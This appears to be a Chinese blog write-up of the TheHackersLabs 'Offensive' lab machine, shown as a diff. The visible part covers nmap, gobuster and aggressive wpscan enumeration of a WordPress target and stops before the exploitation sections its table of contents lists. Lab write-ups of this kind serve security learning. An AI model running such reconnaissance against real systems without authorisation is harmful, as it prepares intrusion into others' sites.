@@ -1,0 +1,597 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>thehackerslabs-Offensive | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="难度:easy kali:192.168.31.34 靶机:192.168.31.66 复习压力太大，打个靶机放松一下 端口扫描root@kali2 [~] ➜  nmap 192.168.31.66                                                                              [12:29:02] Starting Nm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thehackerslabs-Offensive">
+<meta property="og:url" content="https://tao0845.github.io/posts/e23e0315/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="难度:easy kali:192.168.31.34 靶机:192.168.31.66 复习压力太大，打个靶机放松一下 端口扫描root@kali2 [~] ➜  nmap 192.168.31.66                                                                              [12:29:02] Starting Nm">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/01/03/OE4Qhl.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/01/03/OE4dWs.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/01/03/OE4sgK.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/01/03/OE4VVa.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/01/03/OE4foS.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/01/03/OE4lrN.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/01/03/OE4j3L.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/01/03/OE46ii.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/01/03/OE48tX.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/01/03/OE48tX.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/01/03/OE43gj.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/01/03/OE4CVp.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/01/03/OEDOrY.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2025/01/03/OEDaQv.png">
+<meta property="article:published_time" content="2025-01-03T04:24:55.171Z">
+<meta property="article:modified_time" content="2025-01-03T06:08:29.988Z">
+<meta property="article:author" content="ta0">
+<meta property="article:tag" content="wps-hide-login">
+<meta property="article:tag" content="环境变量">
+<meta property="article:tag" content="wordpress">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ooo.0x0.ooo/2025/01/03/OE4Qhl.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">99</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">13</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">156</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8080%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.</span> <span class="toc-text">8080端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getroot"><span class="toc-number">5.</span> <span class="toc-text">getroot</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/e23e0315/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">thehackerslabs-Offensive</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-01-03 12:24:55" itemprop="dateCreated datePublished" datetime="2025-01-03T12:24:55+08:00">2025-01-03</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">3.3k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">19m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/thehackerlabs/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">thehackerlabs</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/wps-hide-login/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">wps-hide-login</span></a><a class="tag-item" href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">环境变量</span></a><a class="tag-item" href="/tags/wordpress/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">wordpress</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p><strong>难度:easy</strong></p>
+<p><strong>kali:192.168.31.34</strong></p>
+<p><strong>靶机:192.168.31.66</strong></p>
+<p>复习压力太大，打个靶机放松一下</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  nmap <span class="token number">192.168</span>.31.66                                                                              <span class="token punctuation">[</span><span class="token number">12</span>:29:02<span class="token punctuation">]</span>
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-01-03 <span class="token number">12</span>:29 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.31.66
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000057s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">996</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT     STATE    SERVICE
+<span class="token number">22</span>/tcp   <span class="token function">open</span>     <span class="token function">ssh</span>
+<span class="token number">80</span>/tcp   <span class="token function">open</span>     http
+<span class="token number">5000</span>/tcp filtered upnp
+<span class="token number">8080</span>/tcp <span class="token function">open</span>     http-proxy
+MAC Address: 08:00:27:14:EB:55 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.14</span> seconds</code></pre>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p><img src="https://ooo.0x0.ooo/2025/01/03/OE4Qhl.png" alt="OE4Qhl.png" loading="lazy"><br>太棒了，是川普~<br>先把’Offensive.thl’加到hosts</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  <span class="token builtin class-name">echo</span> <span class="token string">'192.168.31.66 Offensive.thl'</span> <span class="token operator">|</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://offensive.thl/ <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Gobuster v3.6
+by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://offensive.thl/
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              html,txt,php,bak,zip
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Starting gobuster <span class="token keyword">in</span> directory enumeration mode
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">278</span><span class="token punctuation">]</span>
+/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">278</span><span class="token punctuation">]</span>
+/images               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">315</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://offensive.thl/images/<span class="token punctuation">]</span>
+/index.php            <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://offensive.thl/<span class="token punctuation">]</span>
+/wp-content           <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">319</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://offensive.thl/wp-content/<span class="token punctuation">]</span>
+/wp-includes          <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">320</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://offensive.thl/wp-includes/<span class="token punctuation">]</span>
+/javascript           <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">319</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://offensive.thl/javascript/<span class="token punctuation">]</span>
+/wp-trackback.php     <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">135</span><span class="token punctuation">]</span>
+/wp-admin             <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">317</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://offensive.thl/wp-admin/<span class="token punctuation">]</span>
+<span class="token punctuation">..</span>.</code></pre>
+<p>浅扫一下目录发现是wp，用wpscan扫一下插件漏洞</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  wpscan <span class="token parameter variable">--url</span> http://offensive.thl/ <span class="token parameter variable">-e</span> ap --plugins-detection aggressive --api-token ***********
+_______________________________________________________________
+         __          _______   _____
+         <span class="token punctuation">\</span> <span class="token punctuation">\</span>        / /  __ <span class="token punctuation">\</span> / ____<span class="token operator">|</span>
+          <span class="token punctuation">\</span> <span class="token punctuation">\</span>  /<span class="token punctuation">\</span>  / /<span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>___   ___  __ _ _ __ ®
+           <span class="token punctuation">\</span> <span class="token punctuation">\</span>/  <span class="token punctuation">\</span>/ / <span class="token operator">|</span>  ___/ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span> / __<span class="token operator">|</span>/ _` <span class="token operator">|</span> <span class="token string">'_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.25
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://offensive.thl/ [192.168.31.66]
+[+] Started: Fri Jan  3 12:55:56 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.62 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://offensive.thl/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+Fingerprinting the version - Time: 00:00:03 &lt;============================================> (702 / 702) 100.00% Time: 00:00:03
+[i] The WordPress version could not be detected.
+
+[+] WordPress theme in use: gentlemens-club
+ | Location: http://offensive.thl/wp-content/themes/gentlemens-club/
+ | Latest Version: 1.0.0 (up to date)
+ | Last Updated: 2024-09-25T00:00:00.000Z
+ | Readme: http://offensive.thl/wp-content/themes/gentlemens-club/readme.txt
+ | [!] Directory listing is enabled
+ | Style URL: http://offensive.thl/wp-content/themes/gentlemens-club/style.css
+ | Style Name: Gentlemen'</span>s Club
+ <span class="token operator">|</span> Description: Theme with a simple design, extremely linear and clean. A space reserved <span class="token keyword">for</span> the private club. The p<span class="token punctuation">..</span>.
+ <span class="token operator">|</span> Author: masino1967
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> Found By: Urls In Homepage <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> Version: <span class="token number">1.0</span>.0 <span class="token punctuation">(</span><span class="token number">80</span>% confidence<span class="token punctuation">)</span>
+ <span class="token operator">|</span> Found By: Style <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>  - http://offensive.thl/wp-content/themes/gentlemens-club/style.css, Match: <span class="token string">'Version: 1.0.0'</span>
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating All Plugins <span class="token punctuation">(</span>via Aggressive Methods<span class="token punctuation">)</span>
+ Checking Known Locations - Time: 00:02:05 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">108352</span> / <span class="token number">108352</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:02:05
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Checking Plugin Versions <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Plugin<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Identified:
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> akismet
+ <span class="token operator">|</span> Location: http://offensive.thl/wp-content/plugins/akismet/
+ <span class="token operator">|</span> Latest Version: <span class="token number">5.3</span>.5
+ <span class="token operator">|</span> Last Updated: <span class="token number">2024</span>-11-19T02:02:00.000Z
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> Found By: Known Locations <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>  - http://offensive.thl/wp-content/plugins/akismet/, status: <span class="token number">403</span>
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> <span class="token number">1</span> vulnerability identified:
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Title: Akismet <span class="token number">2.5</span>.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting <span class="token punctuation">(</span>XSS<span class="token punctuation">)</span>
+ <span class="token operator">|</span>     Fixed in: <span class="token number">3.1</span>.5
+ <span class="token operator">|</span>     References:
+ <span class="token operator">|</span>      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
+ <span class="token operator">|</span>      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2015-9357
+ <span class="token operator">|</span>      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
+ <span class="token operator">|</span>      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> The version could not be determined.
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> wps-hide-login
+ <span class="token operator">|</span> Location: http://offensive.thl/wp-content/plugins/wps-hide-login/
+ <span class="token operator">|</span> Latest Version: <span class="token number">1.9</span>.17.1 <span class="token punctuation">(</span>up to <span class="token function">date</span><span class="token punctuation">)</span>
+ <span class="token operator">|</span> Last Updated: <span class="token number">2024</span>-10-09T09:23:00.000Z
+ <span class="token operator">|</span> Readme: http://offensive.thl/wp-content/plugins/wps-hide-login/readme.txt
+ <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Directory listing is enabled
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> Found By: Known Locations <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>  - http://offensive.thl/wp-content/plugins/wps-hide-login/, status: <span class="token number">200</span>
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> Version: <span class="token number">1.9</span>.17.1 <span class="token punctuation">(</span><span class="token number">100</span>% confidence<span class="token punctuation">)</span>
+ <span class="token operator">|</span> Found By: Readme - Stable Tag <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>  - http://offensive.thl/wp-content/plugins/wps-hide-login/readme.txt
+ <span class="token operator">|</span> Confirmed By: Readme - ChangeLog Section <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>  - http://offensive.thl/wp-content/plugins/wps-hide-login/readme.txt
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> wpterm
+ <span class="token operator">|</span> Location: http://offensive.thl/wp-content/plugins/wpterm/
+ <span class="token operator">|</span> Latest Version: <span class="token number">1.1</span>.9 <span class="token punctuation">(</span>up to <span class="token function">date</span><span class="token punctuation">)</span>
+ <span class="token operator">|</span> Last Updated: <span class="token number">2024</span>-11-03T14:29:00.000Z
+ <span class="token operator">|</span> Readme: http://offensive.thl/wp-content/plugins/wpterm/readme.txt
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> Found By: Known Locations <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>  - http://offensive.thl/wp-content/plugins/wpterm/, status: <span class="token number">200</span>
+ <span class="token operator">|</span>
+ <span class="token operator">|</span> Version: <span class="token number">1.1</span>.9 <span class="token punctuation">(</span><span class="token number">100</span>% confidence<span class="token punctuation">)</span>
+ <span class="token operator">|</span> Found By: Readme - Stable Tag <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>  - http://offensive.thl/wp-content/plugins/wpterm/readme.txt
+ <span class="token operator">|</span> Confirmed By: Readme - ChangeLog Section <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
+ <span class="token operator">|</span>  - http://offensive.thl/wp-content/plugins/wpterm/readme.txt
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WPScan DB API OK
+ <span class="token operator">|</span> Plan: <span class="token function">free</span>
+ <span class="token operator">|</span> Requests Done <span class="token punctuation">(</span>during the scan<span class="token punctuation">)</span>: <span class="token number">4</span>
+ <span class="token operator">|</span> Requests Remaining: <span class="token number">18</span>
+
